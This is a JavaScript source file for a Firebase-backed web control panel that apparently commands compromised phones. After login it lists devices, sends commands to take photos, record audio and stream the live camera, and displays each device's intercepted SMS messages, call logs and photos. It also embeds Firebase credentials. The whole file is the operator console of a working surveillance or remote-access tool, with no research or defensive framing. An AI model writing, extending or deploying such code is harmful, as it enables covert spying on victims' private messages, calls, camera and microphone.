// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDNinF16mksrq4j96oj3bOyQvDUjvMjIY8",
  authDomain: "learner-tool.firebaseapp.com",
  databaseURL: "https://learner-tool-default-rtdb.firebaseio.com",
  projectId: "learner-tool",
  storageBucket: "learner-tool.appspot.com",
  messagingSenderId: "953487025826",
  appId: "1:953487025826:web:012054d8cb9f57d9b4d9fb"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

const auth = firebase.auth();
const database = firebase.database();
const storage = firebase.storage();

const authUI = document.getElementById('auth-ui');
const mainUI = document.getElementById('main-ui');
const userInfo = document.getElementById('user-info');
const signInBtn = document.getElementById('sign-in-btn');
const signOutBtn = document.getElementById('sign-out-btn');
const emailInput = document.getElementById('email-input');
const passwordInput = document.getElementById('password-input');

const devicesContainer = document.getElementById('devices');
const deviceControls = document.getElementById('device-controls');
const smsLog = document.getElementById('sms-log');
const callLog = document.getElementById('call-log');
const photoLog = document.getElementById('photo-log');

let selectedDevice = null;

// Handle user authentication state
auth.onAuthStateChanged(user => {
    if (user) {
        userInfo.textContent = `Signed in as: ${user.email}`;
        authUI.style.display = 'none';
        mainUI.style.display = 'block';
        signOutBtn.style.display = 'inline-block';
        loadDevices();
    } else {
        userInfo.textContent = 'Not signed in.';
        authUI.style.display = 'block';
        mainUI.style.display = 'none';
        signOutBtn.style.display = 'none';
        clearUI();
    }
});

// Sign-in function
signInBtn.addEventListener('click', () => {
    const email = emailInput.value;
    const password = passwordInput.value;
    auth.signInWithEmailAndPassword(email, password)
        .catch(error => {
            alert(error.message);
        });
});

// Sign-out function
signOutBtn.addEventListener('click', () => {
    auth.signOut();
});

// Load and display a list of devices
function loadDevices() {
    database.ref('devices').on('value', snapshot => {
        devicesContainer.innerHTML = '';
        snapshot.forEach(deviceSnap => {
            const deviceId = deviceSnap.key;
            const deviceData = deviceSnap.val();
            const deviceCard = document.createElement('div');
            deviceCard.classList.add('device-card');
            deviceCard.innerHTML = `
                <h4>Device: ${deviceData.device_name || deviceId}</h4>
                <p>Status: <span class="${deviceData.online ? 'online' : 'offline'}">${deviceData.online ? 'Online' : 'Offline'}</span></p>
            `;
            deviceCard.addEventListener('click', () => {
                selectDevice(deviceId);
            });
            devicesContainer.appendChild(deviceCard);
        });
    });
}

// Select a device and display its controls and data
function selectDevice(deviceId) {
    selectedDevice = deviceId;
    deviceControls.innerHTML = `
        <h3>Controls for Device: ${deviceId}</h3>
        <div class="controls">
            <button onclick="sendCommand('take_photo')">Take Photo</button>
            <button onclick="sendCommand('record_audio')">Record Audio</button>
            <button onclick="sendCommand('start_live_camera')">Start Live Camera</button>
            <button onclick="sendCommand('stop_live_camera')">Stop Live Camera</button>
            <button onclick="sendWallpaperCommand()">Change Wallpaper</button>
        </div>
    `;
    loadSmsLog(deviceId);
    loadCallLog(deviceId);
    loadPhotoLog(deviceId);
}

// Send a command to the selected device
function sendCommand(command) {
    if (selectedDevice) {
        const commandRef = database.ref(`devices/${selectedDevice}/commands`);
        commandRef.child(command).set(true);
        alert(`Command '${command}' sent to device ${selectedDevice}`);
    } else {
        alert('Please select a device first.');
    }
}

// Send a command to change wallpaper
function sendWallpaperCommand() {
    if (selectedDevice) {
        const imageUrl = prompt("Enter the URL of the image you want to set as wallpaper:");
        if (imageUrl) {
            database.ref(`devices/${selectedDevice}/wallpaper`).set(imageUrl);
            alert(`Wallpaper change command sent to device ${selectedDevice}`);
        }
    } else {
        alert('Please select a device first.');
    }
}

// Load and display SMS logs
function loadSmsLog(deviceId) {
    database.ref(`devices/${deviceId}/sms`).on('value', snapshot => {
        smsLog.innerHTML = '';
        snapshot.forEach(smsSnap => {
            const smsData = smsSnap.val();
            const smsItem = document.createElement('p');
            smsItem.textContent = `From: ${smsData.sender}, Message: ${smsData.message}`;
            smsLog.appendChild(smsItem);
        });
    });
}

// Load and display call logs
function loadCallLog(deviceId) {
    database.ref(`devices/${deviceId}/calls`).on('value', snapshot => {
        callLog.innerHTML = '';
        snapshot.forEach(callSnap => {
            const callData = callSnap.val();
            const callItem = document.createElement('p');
            callItem.textContent = `State: ${callData.state}, Number: ${callData.number || 'N/A'}`;
            callLog.appendChild(callItem);
        });
    });
}

// Load and display photo URLs
function loadPhotoLog(deviceId) {
    // This is a placeholder. A real implementation would list photos from Firebase Storage,
    // which would require more complex logic.
    // For now, we will assume a list of photo URLs is stored in the Realtime Database.
    photoLog.innerHTML = `<p>Viewing photos for device: ${deviceId}</p>`;
}

function clearUI() {
    devicesContainer.innerHTML = '';
    deviceControls.innerHTML = '';
    smsLog.innerHTML = '';
    callLog.innerHTML = '';
    photoLog.innerHTML = '';
}
